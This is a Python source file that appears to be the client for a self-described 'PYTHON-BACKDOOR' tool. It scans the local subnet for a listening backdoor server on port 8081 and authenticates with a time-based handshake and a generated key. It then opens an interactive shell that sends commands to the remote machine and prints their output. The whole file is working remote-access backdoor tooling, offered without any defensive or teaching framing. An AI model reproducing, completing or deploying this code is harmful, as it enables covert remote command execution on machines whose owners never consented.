import socket
import sys
import time
import os
import subprocess
import networkscan
from datetime import datetime

curdir = os.path.dirname(os.path.realpath(__file__)).replace('\\','/')+'/'

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

print('[c] Searching for avaliable server ...')
ip0 = '.'.join(get_ip().split('.')[:-1])+'.0'
scan = networkscan.Networkscan(ip0+'/24')
scan.run()
host = 'phd'
port = 8081
usc = 0
con = 0

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    if len(scan.list_of_hosts_found) == 0:
        print('[c] No avaliable server , switched to manual mode')
        host = input('Enter host ip or host name  : ')
    else:
        print('[c] Avaliable server found, attempting to connect (Press Ctrl+C to cancel) ...')
        for host in scan.list_of_hosts_found:
            try:
                try:
                    s.connect((host, port))
                    s.send(('PYTHON-BACKDOOR-CLIENT'+str(datetime.now().day*6+datetime.now().month*5+datetime.now().year*4+datetime.now().hour*3+datetime.now().minute*2)).encode())
                    recv = s.recv(1024)
                    if recv != ('PYTHON-BACKDOOR-SERVER'+str(datetime.now().day*6+datetime.now().month*5+datetime.now().year*4+datetime.now().hour*3+datetime.now().minute*2)).encode():
                        continue
                except ConnectionRefusedError:
                    continue
                except TimeoutError:
                    continue
                except OSError:
                    continue
                else:
                    con = 1
                    print('[c] Connection to server initiated')
                    break
                if con == 1:
                    break
            except KeyboardInterrupt:
                usc = 1
                break
        while con == 0:
            if usc == 0:
                print('[c] Server not found on the network, switched to manual mode')
            else:
                print('[c] Canceled by user, switched to manual mode')
            while con == 0:
                host = input('Enter server ip : ')
                print('[c] Connection Initiating (Press Ctrl+C to cancel) ..', end='', flush=True)
                while True:
                    try:
                        try:
                            s.connect((host, port))
                            s.send(('PYTHON-BACKDOOR-CLIENT'+str(datetime.now().day*6+datetime.now().month*5+datetime.now().year*4+datetime.now().hour*3+datetime.now().minute*2)).encode())
                            recv = s.recv(1024)
                            if recv != ('PYTHON-BACKDOOR-SERVER'+str(datetime.now().day*6+datetime.now().month*5+datetime.now().year*4+datetime.now().hour*3+datetime.now().minute*2)).encode():
                                continue
                        except ConnectionRefusedError:
                            time.sleep(0.5)
                            print('.', end='', flush=True)
                        except TimeoutError:
                            time.sleep(0.5)
                            print('.', end='', flush=True)
                        except OSError:
                            time.sleep(0.5)
                            print('.', end='', flush=True)
                        else:
                            print('.')
                            print('[c] Connection to server initiated')
                            con = 1
                            break
                    except KeyboardInterrupt:
                        print('.')
                        break
    while True:
        numseed = s.recv(1024).decode()
        if os.path.exists(curdir+'keygen.py'):
            print('[c] Keygen file found, generating authentication key')
            print('[c] Sending generated authentication key ')
            key = (subprocess.Popen('python keygen.py '+numseed, shell=True, stdout=subprocess.PIPE, cwd=curdir).stdout.read()).decode().replace('\n','')
        else:
            print('[c] Keygen file not found, switched to manual mode')
            print('[c] Recived numseed : '+numseed)
            key = input('Enter authentication key : ')
        s.send(key.replace('\r','').encode())
        print('[c] Authentication key sent')
        rsp = s.recv(1024).decode()
        if rsp == 'KEYAUTHERR':
            print('[c] Key authentication error')
        else:
            print('[c] Authentication key accepted')
            break

    def recv_all():
        data = ['0']
        while data[-1][-17:] != 'ENDOFTRANSMISSION':
            data.append(s.recv(1024).decode())
        data[-1] = data[-1].replace('ENDOFTRANSMISSION','')
        data.pop(0)
        return ''.join(data)

    print('[c] Starting terminal \n')
    usp = s.recv(1024).decode()
    path = usp

    try:
        while True:
            p = path.replace('/','\\')[:-1]
            if p[-1] == ':':
                p += '\\'
            command = input('(pybd) %s>'%p).encode()
            s.send(command)
            output = recv_all()
            if output == 'DISCONNECT':
                print('[c] Disconnected from server successfully.')
                break
            print(output)
            path = s.recv(1024).decode()
    except KeyboardInterrupt:
        print('\n[c] Disconnected from server successfully')